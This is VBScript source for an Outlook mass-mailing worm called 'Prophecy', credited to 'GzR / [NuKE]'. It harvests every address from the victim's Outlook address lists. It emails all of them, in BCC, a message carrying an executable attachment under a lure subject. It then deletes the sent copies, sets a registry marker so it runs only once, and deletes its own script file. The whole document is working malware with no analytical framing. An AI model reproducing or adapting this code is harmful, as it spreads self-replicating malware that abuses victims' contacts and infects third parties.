'Prophecy by GzR / [NuKE]
'Special Thanks to Zulu and Evul
On Error Resume Next
Dim HG, D, JS, G, U, FP, VH, M, WshShell, KL
Set WshShell = CreateObject("WScript.Shell")
HG = ""
HG = WshShell.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\prophecy")
If HG = "" Then
  D = ""
  Set D = CreateObject("Outlook.Application")
  If D <> "" Then
    Set JS = D.GetNameSpace("MAPI")
    M = False
    For Each G In JS.AddressLists
      If G.AddressEntries.Count > 0 Then
        Set U = D.CreateItem(0)
        For VH = 1 To G.AddressEntries.Count
          Set FP = G.AddressEntries(VH)
          If VH = 1 Then
            U.BCC = FP.Address
          Else
            U.BCC = U.BCC & "; " & FP.Address
          End If
        Next
        U.Subject = "I Finally Found it!"
        U.Body = "Maby the prophecy will come true for you."
        U.Attachments.Add "C:\WINDOWS\prophecy.exe"
        U.DeleteAfterSubmit = True
        U.Send
        M = True
      End If
    Next
    If M = True Then
      WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\prophecy","Microsoft Windows"
    End If
  End If
End If
Set KL = CreateObject("Scripting.FileSystemObject") 
KL.DeleteFile Wscript.ScriptFullName